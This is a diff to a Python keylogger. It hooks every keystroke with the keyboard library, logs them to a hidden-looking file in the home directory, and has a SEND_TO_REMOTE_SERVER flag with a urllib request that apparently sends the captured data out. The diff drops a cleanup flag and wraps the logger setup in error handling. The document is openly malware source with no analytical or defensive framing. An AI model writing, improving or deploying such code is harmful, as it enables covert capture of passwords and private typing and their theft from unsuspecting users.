@@ -14,7 +14,6 @@ MAP = {
 
 FILE_NAME = "{0}/ksts.log".format(str(Path.home()))
 SEND_TO_REMOTE_SERVER = True
-CLEAR_ON_STARTUP = True
 TERMINATE_KEY = "f7"
 
 def callback(output, is_down, event):
@@ -56,14 +55,16 @@ def main():
         }
       )
       request.urlopen(req)
-  if CLEAR_ON_STARTUP:
-    if os.path.exists(FILE_NAME):
-      os.remove(FILE_NAME) # Delete the old file
-  is_down = {} # Indicates if a key is being pressed
-  output = open(FILE_NAME, "a") # Output file
-  atexit.register(onexit, output) # Close the file at the end of the program
-  keyboard.hook(partial(callback, output, is_down)) # Install the keylogger
-  keyboard.wait(TERMINATE_KEY) # Run until end key is pressed
+    try:
+      if os.path.exists(FILE_NAME):
+        os.remove(FILE_NAME) # Delete the old file
+      is_down = {} # Indicates if a key is being pressed
+      output = open(FILE_NAME, "a") # Output file
+      atexit.register(onexit, output) # Close the file at the end of the program
+      keyboard.hook(partial(callback, output, is_down)) # Install the keylogger
+      keyboard.wait(TERMINATE_KEY) # Run until end key is pressed
+    except PermissionError:
+      print("File is probably being used by another process")
 
 if __name__ == "__main__":
   main()
